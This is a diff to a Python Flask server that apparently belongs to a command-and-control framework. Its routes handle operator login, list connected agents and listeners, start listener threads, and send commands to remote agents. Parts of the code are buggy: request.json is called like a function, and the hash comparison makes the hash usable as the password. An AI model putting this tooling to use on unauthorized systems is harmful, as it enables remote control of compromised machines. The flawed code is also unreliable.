@@ -1,4 +1,7 @@
-from lib import vglobals
+from lib.vglobals.servercfg import *
+from lib.vglobals.sharedvars import *
+from lib.globals import refresh_available_listeners, listeners_available
+
 from hadler import BUFFER, run as handler_run
 from lib.sthread import Sthread
 
@@ -8,7 +11,6 @@ from uuid import uuid4
 
 app = Flask(__name__)
 
-
 @app.route("/login", methods=["POST"])
 def login():
     if request.json is None:
@@ -17,34 +19,34 @@ def login():
     username: str = request.json["username"]
     password: str = request.json["password"]
 
-    if not username in vglobals.WHITELIST:
+    if not username in WHITELIST:
         return "Invalid username", 401
 
     orginal_password = sha256(
-        vglobals.WHITELIST[username].encode()).hexdigest()
+        WHITELIST[username].encode()).hexdigest()
 
     if password != orginal_password:
         return "Invalid password", 401
 
     session_uuid = uuid4().hex
 
-    vglobals.clients_session[username] = session_uuid
+    clients_session[username] = session_uuid
 
-    return session_uuid
+    return jsonify({"session": session_uuid, "wsaddr": "ws://{}:{}".format(WEBSOCKET_SERVER_IP, WEBSOCKET_SERVER_PORT)})
 
 
 @app.route("/get_agents/<session>")
 def get_agents(session: str):
-    agents = []
+    agents_row = []
 
-    if not session in list(vglobals.clients_session.values()):
+    if not session in list(clients_session.values()):
         return "Invalid session ID", 401
 
-    for agent in vglobals.agents:
-        addr = vglobals.agents[agent].addr
-        agents.append([agent, addr])
+    for agent in agents:
+        addr = agents[agent].addr
+        agents_row.append([agent, addr])
 
-    return jsonify(agents)
+    return jsonify(agents_row)
 
 
 @app.route("/add_listener", methods=["POST"])
@@ -54,30 +56,44 @@ def add_listener():
 
     session: str = request.json["auth"]
 
-    if not session in list(vglobals.clients_session.values()):
+    if not session in list(clients_session.values()):
         return "Invalid session ID", 401
 
     listener_type = request.json["type"]
 
-    vglobals.refresh_available_listeners()
-    if not listener_type in vglobals.listeners_available:
+    refresh_available_listeners()
+    if not listener_type in listeners_available:
         return "Invalid listener type", 403
 
     listener_name: str = request.json["name"]
     listener_ip: str = request.json["ip"]
     listener_port: str = request.json["port"]
 
-    vglobals.listeners[listener_name] = {}
-    vglobals.listeners[listener_name]["ip"] = listener_ip
-    vglobals.listeners[listener_name]["port"] = listener_port
-    vglobals.listeners[listener_name]["type"] = listener_type
+    listeners[listener_name] = {"ip": listener_ip, "port": listener_port, "type": listener_type}
 
     listener_thread = Sthread(target=handler_run, args=(
         listener_ip, listener_port, listener_type))
 
-    vglobals.listeners_threads[listener_name] = listener_thread
+    listeners_threads[listener_name] = listener_thread
 
     return jsonify(True)
+
+@app.route("/get_listeners/<session>")
+def get_listeners(session: str):
+    listeners_row = []
+
+    if not session in list(clients_session.values()):
+        return "Invalid session ID", 401
+
+    for listener_name in listeners:
+        listener = listeners[listener_name]
+        
+        ip = listener["ip"]
+        port = listener["port"]
+        type = listener["type"]
+        listeners_row.append([listener_name, ip, port, type])
+
+    return jsonify(listeners_row)
 
 @app.route("/send_command", methods=["POST"])
 def send_command(): # TODO: send command to agent, open websocket, send response and close  
@@ -86,20 +102,22 @@ def send_command(): # TODO: send command to agent, open websocket, send response
 
     session: str = request.json["auth"]
 
-    if not session in list(vglobals.clients_session.values()):
+    if not session in list(clients_session.values()):
         return "Invalid session ID", 401
     
     target_id: str = request.json("target")
     command: str = request.json("cmd")
 
-    if not target_id in vglobals.agents:
+    if not target_id in agents:
         return "Agent not found", 500
     
-    agent = vglobals.agents[target_id]
+    agent = agents[target_id]
 
     agent.send(command.encode())
     agent.recv(BUFFER)
     return ""
+
+# TODO: Websocket chat
 
 def run(ip: str, port: int, ssl=False, ssl_context=()):
     if ssl:
